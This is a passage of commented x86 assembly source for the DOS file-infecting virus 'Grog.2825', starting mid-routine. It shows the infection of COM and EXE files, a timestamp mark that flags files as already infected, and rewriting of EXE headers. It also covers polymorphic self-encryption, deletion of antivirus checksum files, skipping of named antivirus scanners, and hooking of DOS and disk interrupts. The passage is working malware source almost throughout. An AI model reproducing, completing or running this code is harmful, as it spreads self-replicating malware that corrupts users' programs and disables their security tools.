            cmp     es:[di+28h],'OC'    ; COM executable?
            jne     examine_exe     ; Not equal? Jump to examine_exe
            cmp     byte ptr es:[di+2Ah],'M'
            je      examine_name    ; Equal? Jump to examine_name

            jmp     examine_exit

            nop
   examine_exe:
            cmp     es:[di+28h],'XE'    ; EXE executable?
            je      examine_exe_    ; Equal? Jump to examine_exe_

            jmp     examine_exit

            nop
   examine_exe_:
            cmp     byte ptr es:[di+2Ah],'E'
            je      examine_name    ; Equal? Jump to examine_name
   examine_exit:
            ret             ; Return!
   examine_name:
            mov     ax,di       ; AX = offset of system file table...
            add     ax,20h      ; AX = offset of filename
            lea     si,table_begin-06h  ; SI = offset of table_begin - 06h
   examine_loop:
            add     si,06h      ; SI = offset of next filename in ...

            push    si          ; Save SI at stack
            mov     di,ax       ; DI = offset of filename
            mov     cx,06h      ; Compare six bytes
            rep     cmpsb       ; Compare filename with table of f...
            pop     si          ; Load SI from stack
            jne     tst_loop_end    ; Not equal? Jump to tst_loop_end

            jmp     examine_exit
   tst_loop_end:
            cmp     si,offset table_end-06h
            jne     examine_loop    ; Not equal? Jump to examine_loop

            mov     di,ax       ; DI = offset of filename
            sub     di,20h      ; DI = offset of system file table...

            mov     al,es:[di+0dh]  ; AL = file time
            and     al,00011111b    ; AL = seconds of file time
            cmp     al,00010001b    ; Already infected (34 seconds)?
            jne     read_file       ; Not equal? Jump to read_file

            ret             ; Return!
   read_file:
            push    es          ; Save ES at stack
            call    set_file_sof
            pop     es          ; Load ES from stack

            mov     ah,3fh      ; Read from file
            mov     cx,(code_end-code_begin)
            lea     dx,file_buffer  ; DX = offset of file_buffer
            call    int21_simula

            mov     [com_exe_ov],00h    ; COM executable

            nop

            cmp     word ptr [file_buffer],'ZM'
            je      find_win        ; Equal? Jump to find_win
            cmp     word ptr [file_buffer],'MZ'
            je      find_win        ; Equal? Jump to find_win

            cmp     byte ptr es:[di+28h],'C'
            je      tst_filesize    ; COM executable? Jump to tst_file...

            ret             ; Return!
   find_win:
            mov     cx,54h      ; Search through eighty-four bytes
            lea     si,file_buffer+200h ; SI = offset of file_buffer + 200h
   win_loop:
            lodsb           ; AL = byte of file_buffer
            and     al,01011111b    ; Upcase character
            cmp     al,'W'              ; Found first character of the st...?
            jne     jmp_win_loop    ; Not equal? Jump to jmp_win_loop
            mov     al,[si]         ; AL = byte of file_buffer
            and     al,01011111b    ; Upcase character
            cmp     al,'I'              ; Found second character of the s...?
            jne     jmp_win_loop    ; Not equal? Jump to jmp_win_loop
            mov     al,[si+01h]     ; AL = byte of file_buffer
            and     al,01011111b    ; Upcase character
            cmp     al,'N'              ; Found third character of the st...?
            je      infect_exit     ; Equal? Jump to infect_exit
   jmp_win_loop:
            loop    win_loop

            mov     [com_exe_ov],01h    ; EXE/Overlay executable

            nop
   tst_filesize:
            mov     ax,es:[di+11h]  ; AX = filesize
            cmp     ax,(code_end-code_begin+100h)
            jb      infect_exit     ; Filesize too small? Jump to infe...

            cmp     [com_exe_ov],00h    ; COM executable?
            je      tst_com_size    ; Equal? Jump to tst_com_size
            cmp     word ptr es:[di+13h],05h
            ja      infect_exit     ; Filesize too large? Jump to infe...

            jmp     mark_file

            nop
   tst_com_size:
            cmp     ax,0fefeh-(code_end-code_begin+108h)*04h+02h
            ja      infect_exit     ; Filesize too large? Jump to infe...
            cmp     word ptr es:[di+13h],00h
            jne     infect_exit     ; Filesize too large? Jump to infe...

            mov     [origin_off],ax     ; Store offset of original code of...
   mark_file:
            mov     byte ptr es:[di+02h],02h

            mov     ax,es:[di+0dh]  ; AX = file time
            and     al,11100000b    ; Clear seconds of file time
            add     al,00010001b    ; Set infection mark (34 seconds)

            push    ax          ; Save AX at stack
            push    es:[di+0fh]     ; Save file date at stack

            push    es di       ; Save registers at stack
            call    infect_file
            pop     di es       ; Load registers from stack

            pop     es:[di+0fh]     ; Load file date from stack
            pop     es:[di+0dh]     ; Load file time from stack
   infect_exit:
            ret             ; Return!
            endp

            db      '-=ðGROG v5.0 (C) ''93 by GROG - Italyð=-'

   infect_file  proc    near        ; Infect COM/EXE/Overlay file
            call    set_file_eof

            cmp     [com_exe_ov],01h    ; EXE/Overlay executable?
            je      move_header     ; Equal? Jump to move_header

            jmp     write_origin
   move_header:
            lea     si,file_buffer+0eh  ; SI = offset of file_buffer + 0eh
            lea     di,stack_seg    ; DI = offset of stack_seg
            mov     cx,05h      ; Move ten bytes
            rep     movsw       ; Move ten bytes of file_buffer to...

            mov     ax,[sft_segment]    ; AX = segment of system file table
            mov     es,ax       ; ES =    "    "    "     "     "
            mov     di,[sft_offset]     ; DI = offset of system file table

            mov     ax,es:[di+11h]  ; AX = low-order 16-bits of filesize
            mov     dx,es:[di+13h]  ; DX = high-order 16-bits of filesize

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            push    dx ax       ; Save registers at stack
            and     ax,0000000111111111b
            mov     word ptr [file_buffer+02h],ax

            pop     ax          ; Load AX from stack
            push    ax          ; Save AX at stack

            and     ah,11111110b
            ror     ah,01h      ; Rotate AH one bit to the right
            mov     al,ah       ; AL = high-order byte of low-orde...
            mov     ah,00h      ; Zero AH
            mov     word ptr [file_buffer+04h],ax
            pop     ax cx       ; Load registers from stack

            push    cx          ; Save CX at stack
            or      cx,cx       ; High-order 16-bits of filesize e...
            jz      calc_header     ; Zero? jump to calc_header
   pages_loop:
            add     word ptr [file_buffer+04h],80h

            loop    pages_loop
   calc_header:
            pop     dx          ; Load DX from stack
            push    dx          ; Save DX at stack
            mov     dx,word ptr [file_buffer+08h]

            mov     cl,04h      ; Multiply header size in paragrap...
            rol     dx,cl       ; DX = header size
            sub     ax,dx       ; Subtract header size from filesize
            push    ax          ; Save AX at stack
            xor     bp,bp       ; Zero BP
            xor     cx,cx       ; Zero CX
            and     ax,0000000000001111b
            cmp     al,00h      ; Calculate number of bytes in la...?
            je      calc_pages      ; Equal? Jump to calc_pages

            mov     bp,ax       ; BP = total number of 512-bytes p...
            neg     al          ; Negate AL
            and     al,00001111b

            sub     bp,10h      ; Subtract a paragraph from total ...
   calc_pages:
            add     bp,10h      ; Add a paragraph to total number ...

            inc     word ptr [file_buffer+04h]
            add     word ptr [file_buffer+02h],bp
   test_pages:
            cmp     word ptr [file_buffer+02h],200h
            jb      write_file      ; Below? Jump to write_file

            sub     word ptr [file_buffer+02h],200h
            inc     word ptr [file_buffer+04h]

            jmp     test_pages
   write_file:
            mov     cx,ax       ; CX = number of bytes to write
            add     cx,100h         ; "  "   "    "    "   "    "
            lea     dx,data_buffer  ; DX = offset of data_buffer
            mov     ah,40h      ; Write to file
            call    int21_simula
            jnc     test_read       ; No error? Jump to test_read

            pop     ax ax       ; Load registers from stack

            ret             ; Return!
   test_read:
            pop     ax          ; Load AX from stack

            add     ax,cx       ; Add number of bytes actually wri...
            cmp     ax,cx       ; Calculate number of bytes in la...?
            jae     calc_pages_     ; Above or equal? Jump to calc_pages_

            pop     dx          ; Load DX from stack
            inc     dx          ; Increase DX
            push    dx          ; Save DX at stack
   calc_pages_:
            push    ax          ; Save AX at stack
            add     cx,(code_end-code_begin) mod 200h)
            add     word ptr [file_buffer+02h],cx
   test_pages_:
            cmp     word ptr [file_buffer+02h],200h
            jb      calc_cs_ip      ; Below? Jump to calc_cs_ip

            inc     word ptr [file_buffer+04h]
            sub     word ptr [file_buffer+02h],200h

            jmp     test_pages_
   calc_cs_ip:
            add     word ptr [file_buffer+04h],05h

            nop

            mov     word ptr [file_buffer+14h],100h

            pop     ax          ; Load AX from stack

            mov     cl,04h
            shr     ax,cl       ; Convert bytes to paragraphs
            sub     ax,10h      ; Subtract instruction pointer
            mov     word ptr [file_buffer+16h],ax
            mov     word ptr [file_buffer+0eh],ax

            xor     dx,dx       ; Zero DX

            pop     cx          ; Load CX from stack (DX)
   calc_vir_ptr:
            add     dh,10h      ; Calculate pointer to virus

            loop    calc_vir_ptr

            add     word ptr [file_buffer+16h],dx

            inc     dx          ; DX = initial SS relative to star...
            add     word ptr [file_buffer+0eh],dx
            mov     word ptr [file_buffer+10h],0eeh

            call    set_file_sof

            mov     cx,18h      ; Write eightteen bytes
            lea     dx,file_buffer  ; DX = offset of file_buffer
            mov     ah,40h      ; Write to file
            call    int21_simula

            call    set_file_eof

            jmp     grog_crypt_

            nop
   write_origin:
            lea     dx,file_buffer  ; DX = offset of file_buffer
            mov     cx,(code_end-code_begin)
            mov     ah,40h      ; Write to file
            call    int21_simula
            jnc     grog_crypt      ; No error? Jump to grog_crypt

            ret             ; Return!
   grog_crypt:
            call    set_file_sof
   grog_crypt_:
            push    bx          ; Save BX at stack
            lea     di,decrypt_algo     ; DI = offset of decrypt_algo
            lea     bx,encrypt_algo     ; BX = offset of encrypt_algo
            mov     cx,03h      ; Generate three encryption/decryp...
   create_loop:
            in      al,40h      ; AL = 8-bit random number
            mov     dh,al       ; DL = encryption/decryption key
            in      al,40h      ; AL = 8-bit random number
            in      al,40h      ; AL =   "     "      "
   get_rnd_num:
            sub     al,20h      ; Subtract twenty from the 8-bit r...

            cmp     al,20h      ; Too large a 8-bit random number?
            ja      get_rnd_num     ; Above? Jump to get_rnd_num

            and     ax,0000000000111100b
            lea     si,table_begin_     ; SI = offset of table_begin_
            add     si,ax       ; SI = offset of decryption algori...

            push    [si]        ; Save decryption algorithm at stack
            pop     [di-02h]        ; Load decryption algorithm from s...
            push    [si+02h]        ; Save encryption algorithm at stack
            pop     ax          ; Load AX from stack
            push    ax          ; Save AX at stack
            pop     [bx-02h]        ; Load encryption algorithm from s...

            cmp     al,0d0h         ; Store encryption/decryption key?
            jae     move_idx_ptr    ; Above or equal? Jump to move_idx...

            mov     [di-01],dh      ; Store encryption/decryption key
            mov     [bx-01],dh      ;   "             "            "
   move_idx_ptr:
            inc     di          ; Increase DI
            inc     di          ;    "     "
            dec     bx          ; Decrease BX
            dec     bx          ;    "     "

            loop    create_loop

            pop     bx          ; Load BX from stack

            mov     si,100h         ; SI = offset of beginning of code
            lea     di,file_buffer  ; DI = offset of file_buffer
            mov     cx,(crypt_begin-code_begin)
            rep     movsb       ; Move decryptor to file_buffer

            mov     cx,(crypt_end-crypt_begin)
   encrypt_loop:
            lodsb           ; AL = byte of plain code

            db      06h dup(90h)    ; Encryption algorithm
   encrypt_algo equ     word ptr $      ;     "          "

            stosb           ; Store byte of encrypted code

            loop    encrypt_loop

            mov     cx,(code_end-code_begin)

            cmp     [com_exe_ov],01h    ; EXE/Overlay executable?
            jne     write_virus     ; Not equal? Jump to write_virus

            add     cx,bp       ; CX = number of bytes to write
   write_virus:
            lea     dx,file_buffer  ; DX = offset of file_buffer
            mov     ah,40h      ; Write to file
            call    int21_simula

            call    del_crc_file

            mov     ax,[sft_segment]    ; AX = segment of system file table
            mov     es,ax       ; ES =    "    "    "     "     "
            mov     di,[sft_offset]     ; DI = offset of system file table

            or      byte ptr es:[di+06h],01000000b

            ret             ; Return!
            endp

   set_file_sof proc    near        ; Set current file position (SOF)
            mov     ax,[sft_segment]    ; AX = segment of system file table
            mov     es,ax       ; ES =    "    "    "     "     "
            mov     di,[sft_offset]     ; DI = offset of system file table

            mov     word ptr es:[di+15h],00h
            mov     word ptr es:[di+17h],00h

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            ret             ; Return!
            endp

   set_file_eof proc    near        ; Set current file position (EOF)
            mov     ax,[sft_segment]    ; AX = segment of system file table
            mov     es,ax       ; ES =    "    "    "     "     "
            mov     di,[sft_offset]     ; DI = offset of system file table

            push    es:[di+11h]     ; Save low-order 16-bits of filesi...
            pop     es:[di+15h]     ; Load low-order 16-bits of filesi...
            push    es:[di+13h]     ; Save high-order 16-bits of files...
            pop     es:[di+17h]     ; Load high-order 16-bits of files...

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            ret             ; Return!
            endp

   del_crc_file proc    near        ; Delete CRC files
            mov     ah,41h      ; Delete file
            lea     dx,anti_vir_dat     ; DX = offset of anti_vir_dat
            call    int21_simula

            mov     ah,41h      ; Delete file
            lea     dx,chklist__    ; DX = offset of chklist__
            call    int21_simula

            mov     ah,41h      ; Delete file
            lea     dx,_nav___no    ; DX = offset of _nav___no
            call    int21_simula

            ret             ; Return!
            endp

   xchg_i13_i40 proc    near        ; Exchange address interrupt 13/in...
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    word ptr [int13_addr]
            push    word ptr [int13_addr+02h]

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            push    ds:[13h*04h]    ; Get interrupt offset 13h
            pop     word ptr cs:[int13_addr]
            push    ds:[13h*04h+02h]    ; Get interrupt segment 13h
            pop     word ptr cs:[int13_addr+02h]

            pop     ds:[13h*04h+02h]    ; Set interrupt segment 13h
            pop     ds:[13h*04h]    ; Set interrupt offset 13h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    word ptr [int40_addr]
            push    word ptr [int40_addr+02h]

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            push    ds:[40h*04h]    ; Get interrupt offset 40h
            pop     word ptr cs:[int40_addr]
            push    ds:[40h*04h+02h]    ; Get interrupt segment 40h
            pop     word ptr cs:[int40_addr+02h]

            pop     ds:[40h*04h+02h]    ; Set interrupt segment 40h
            pop     ds:[40h*04h]    ; Set interrupt offset 40h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            ret             ; Return!
            endp

   tbmem_retro  proc    near        ; TbMem retro structures
            mov     ah,35h      ; Get interrupt vector
            call    int21_simula

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            xor     di,di       ; Zero DI
   find_tbmem:
            mov     si,di       ; SI = offset of interrupt
   find_tbmem_:
            cmp     si,20h      ; Searched through thirty-two bytes?
            ja      retro_exit      ; Above? Jump to retro_exit

            lodsb           ; AL = byte of interrupt
            cmp     al,'T'              ; Found first character of the st...?
            jne     find_tbmem_     ; Not equal? Jump to find_tbmem_

            mov     di,si       ; DI = offset of interrupt

            lodsw           ; AX = word of interrupt
            cmp     ax,'MB'             ; Found second and third characte...?
            jne     find_tbmem      ; Not equal? Jump to find_tbmem
            lodsw           ; AX = word of interrupt
            cmp     ax,'ME'             ; Found fourth and fifth characte...?
            jne     find_tbmem      ; Not equal? Jump to find_tbmem
   find_int20:
            mov     si,di       ; SI = offset of interrupt
   find_int20_:
            cmp     si,200h         ; Searched through five hundred an...
            ja      retro_exit      ; Above? Jump to retro_exit

            lodsb           ; AL = byte of interrupt
            cmp     al,byte ptr cs:[int20_addr]
            jne     find_int20_     ; Not equal? Jump to find_int20_

            mov     di,si       ; DI = offset of interrupt

            lodsb           ; AL = byte of interrupt
            cmp     al,byte ptr cs:[int20_addr+01h]
            jne     find_int20      ; Not equal? Jump to find_int20
            lodsb           ; AL = byte of interrupt
            cmp     al,byte ptr cs:[int20_addr+02h]
            jne     find_int20      ; Not equal? Jump to find_int20
            lodsb           ; AL = byte of interrupt
            cmp     al,byte ptr cs:[int20_addr+03h]
            jne     find_int20      ; Not equal? Jump to find_int20

            mov     si,di       ; SI = offset of interrupt
            mov     [si-01],offset int20_virus
            mov     [si+01],cs      ; Set interrupt vector 20h
            mov     [si+03],offset int21_virus
            mov     [si+05],cs      ; Set interrupt vector 21h
   retro_exit:
            ret
            endp
   tst_vir_func:
            cmp     ax,0fe01h       ; Flip function?
            jne     test_tequila    ; Not equal? Jump to test_tequila

            mov     ax,1feh         ; Flip already resident

            iret            ; Interrupt return!
   test_tequila:
            cmp     ax,0fe02h       ; Tequila function?
            jne     test_cascade    ; Not equal? Jump to test_cascade

            mov     ax,1fdh         ; Tequila already resident

            iret            ; Interrupt return!
   test_cascade:
            cmp     ax,4bffh        ; Cascade/justice function?
            jne     test_invader    ; Not equal? Jump to test_invader

            mov     di,55aah        ; Cascade/justice already resident

            iret            ; Interrupt return!
   test_invader:
            cmp     ax,4243h        ; Invader function?
            jne     test_diamond    ; Not equal? Jump to test_diamond

            mov     ax,5678h        ; Invader already resident

            iret            ; Interrupt return!
   test_diamond:
            cmp     ax,0d5aah       ; Diamond/dir function?
            jne     test_gotcha     ; Not equal? Jump to test_gotcha

            mov     ax,2a55h        ; Diamond already resident

            iret            ; Interrupt return!
   test_gotcha:
            cmp     ax,0dadah       ; Gotcha function?
            jne     jmp_tst_func    ; Not equal? Jump to jmp_tst_func

            mov     ah,0a5h         ; Gotcha already resident

            iret            ; Interrupt return!
   jmp_tst_func:
            jmp     test_functio

   int24_virus  proc    near        ; Interrupt 24h of Grog.2825
            mov     al,03h      ; Fail system call in progress
   int24_exit:
            iret            ; Interrupt return!
            endp

            nop

   int20_virus  proc    near        ; Interrupt 20h of Grog.2825
            mov     ax,8e67h        ; Grog.2825 function
            int     21h

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            cli             ; Clear interrupt-enable flag
            push    ds:[21h*04h]    ; Get interrupt offset 21h
            pop     word ptr cs:[int21_origin]
            push    ds:[21h*04h+02h]    ; Get interrupt segment 21h
            pop     word ptr cs:[int21_origin+02h]

            mov     ds:[21h*04h],offset int21_virus
            mov     ds:[21h*04h+02h],cs ; Set interrupt vector 21h
            sti             ; Set interrupt-enable flag
   int20_exit:
            db      0eah        ; JMP imm32 (opcode 0eah)
   int20_addr   dd      ?           ; Address of interrupt 20h
            endp

   int21_simula proc    near        ; Simulate interrupt 21h
            pushf           ; Save flags at stack

            db      9ah         ; CALL imm32 (opcode 9ah)
   int21_addr   dd      ?           ; Address of interrupt 21h

            ret             ; Return!
            endp

   origin_off   dw      terminate-100h  ; Offset of original code of infec...
   stack_seg    dw      ?           ; Stack segment
   stack_ptr    dw      ?           ; Stack pointer
   checksum     dw      ?           ; Checksum
   origin_ip    dw      ?           ; Original instruction pointer
   origin_cs    dw      ?           ; Original code segment
   com_exe_ov   db      00h         ; COM or EXE/Overlay executable
   retro_struc  db      ?           ; TbMem retro structures
   tunnel_addr  equ     dword ptr $     ; Address of tunneled interrupt
   int13_addr   dd      ?           ; Address of interrupt 13h
   int21_addr_  equ     dword ptr $-04h     ; Address of interrupt 21h
   int40_addr   dd      ?           ; Address of interrupt 40h
   int01_addr   dd      ?           ; Address of interrupt 01h
   c__command_c db      'C:\COMMAND.COM',00h
   c__dos_comma db      'C:\DOS\COMMAND.COM',00h
   file_specifi db      '*.*',00h           ; File specification
   table_begin  db      'IBMBIO'            ; IBMBIO.COM
            db      'IBMDOS'            ; IBMDOS.COM
            db      'SCAN  '            ; McAfee ViruScan
            db      'CLEAN '            ;   "       "
            db      'F-PROT'            ; F-PROT
            db      'CPAV  '            ; Central Point Anti-Virus
            db      'MSAV  '            ; Microsoft Anti-Virus
            db      'NAV   '            ; Norton Anti-Virus
   table_end:
   table_begin_:
            add     al,00h      ; Decryption algorithm
            sub     al,00h      ; Encryption     "
            sub     al,00h      ; Decryption     "
            add     al,00h      ; Encryption     "
            xor     al,00h      ; Decryption     "
            xor     al,00h      ; Encryption     "
            rol     al,01h      ; Decryption     "
            ror     al,01h      ; Encryption     "
            ror     al,01h      ; Decryption     "
            rol     al,01h      ; Encryption     "
            dec     al          ; Decryption     "
            inc     al          ; Encryption     "
            inc     al          ; Decryption     "
            dec     al          ; Encryption     "
            neg     al          ; Decryption     "
            neg     al          ; Encryption     "
            not     al          ; Decryption     "
            not     al          ; Encryption     "
   table_end_:
   anti_vir_dat db      'ANTI-VIR.DAT',00h  ; ThunderBYTE Anti-Virus CRC file
   chklist__    db      'CHKLIST.*',00h     ; Microsoft Anti-Virus/Central Poi...
   _nav___no    db      '\NAV_._NO',00h     ; Norton Anti-Virus CRC file
   crypt_end:
   code_end:
   sft_segment  dw      ?           ; Segment of system file table
   sft_offset   dw      ?           ; Offset of system file table
   file_buffer:
            db      18h dup(?)
   command_inst db      ?           ; Instance of COMMAND.COM already ...
   terminate:
            int     20h         ; Terminate program!

            db      0b3d8h dup(?)
   data_buffer:
            db      1ea8h dup(?)
   dta:
            db      15h dup(?)      ; Used by DOS for find next-process
   file_attr    db      ?           ; File attribute
   file_time    dw      ?           ; File time
   file_date    dw      ?           ; File date
   filesize     dd      ?           ; Filesize
   filename     db      0dh dup(?)      ; Filename
   data_end:

   end      code_begin
